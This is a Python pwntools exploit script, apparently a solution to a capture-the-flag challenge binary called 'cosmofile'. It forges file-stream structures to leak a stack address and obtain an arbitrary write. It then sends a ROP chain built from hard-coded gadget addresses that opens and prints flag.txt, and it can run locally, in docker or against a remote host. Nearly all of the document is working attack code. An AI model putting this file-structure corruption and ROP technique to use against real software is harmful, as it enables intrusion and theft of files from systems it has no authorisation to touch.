#!/usr/bin/env python3

from pwn import *
import sys

context.binary = e = ELF("./cosmofile", checksec=False)
context.log_level = 'debug'
gs = '''
b*0x40C86D  
b*0x40CE85
# b*0x40CD66
b*0x40CD2E
'''

def init():
    if args.LOCAL:
        p = e.process()
        gdb.attach(p, gdbscript=gs)
    if args.DOCKER:
        p = remote("localhost", 5000)
        # gdb.attach(p, gdbscript=gs) 
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p

p = init()  
# =================================================
# using config fread() to read stack address:
pause()
cosmo = 7238770
_argv = 0x438098
payload = flat(
    p32(0),
    p32(0), # oflags
    p32(0), # state
    p32(3), # fd
    p32(0), # pid
    p32(0), # padding
    p32(0x100), # size
    p32(0), # beg
    p32(0x1000), # end
    p32(0), # padding
    p64(_argv), # buffer
    # ...
)
p.sendlineafter(b"> ", str(cosmo))
p.sendafter(b"secret...\n", payload)    
p.sendlineafter(b"> ", b"1")
p.recvuntil(b"Content of cosmofile:\n")
leak_stack = u64(p.recv(6).ljust(8, b"\00"))
log.info(f"leak stack: {hex(leak_stack)}")

# =================================================
# using config fread to get aaw.
# create ROP to stack that call ROP chain.
# some important data: data_len = 0x1000, len = end - beg.
# some checking: 
# (f->oflags & 3) == 1. 
# end < beg. 
# len >= data_len.
# fd == -1.
# end != beg: trigger this check.
# bypass:  f->bufmode == 2 || (size = f->size, v11?? >= size).

ret_addr = leak_stack - 0x1070
payload = flat(
    p32(0),
    p32(0), # oflags
    p32(0), # state
    p32(0), # fd
    p32(0), # pid
    p32(0), # padding
    p32(0x100c), # size
    p32(0x100), # beg
    p32(0x100), # end
    p32(0), # padding
    p64(ret_addr), # buffer
    # ...
)
p.sendlineafter(b"> ", str(cosmo))
p.sendafter(b"secret...\n", payload)
p.sendlineafter(b"> ", b"1")
syscall = p64(0x4111FA)
pop_rax = p64(0x000000000040bdf5)
pop_rsi_rdi_rbp = p64(0x000000000040401d)
pop_rdx_rbx_rbp = p64(0x0000000000427748)
pop_rcx_rbx_r12_r13_r14_rbp = p64(0x00000000004035fe)
mov_r10_rcx_syscall = p64(0x000000000041710e)
payload = flat(
# open:
    b"A"*0x1000, 
    pop_rsi_rdi_rbp,
    p64(0),
    p64(leak_stack - 0xf88),
    p64(0),
    pop_rdx_rbx_rbp,
    p64(0)*3,
    pop_rax,
    p64(0x2),
    syscall,
# sendfile:
    pop_rsi_rdi_rbp,
    p64(4),
    p64(1),
    p64(0),
    pop_rcx_rbx_r12_r13_r14_rbp,
    p64(0x100),
    p64(0)*5,
    pop_rdx_rbx_rbp,
    p64(0)*3,
    pop_rax,
    p64(40),
    mov_r10_rcx_syscall,
    b"flag.txt\00",
)
p.sendafter(b"Reading from cosmofile:\n", payload)


p.interactive()
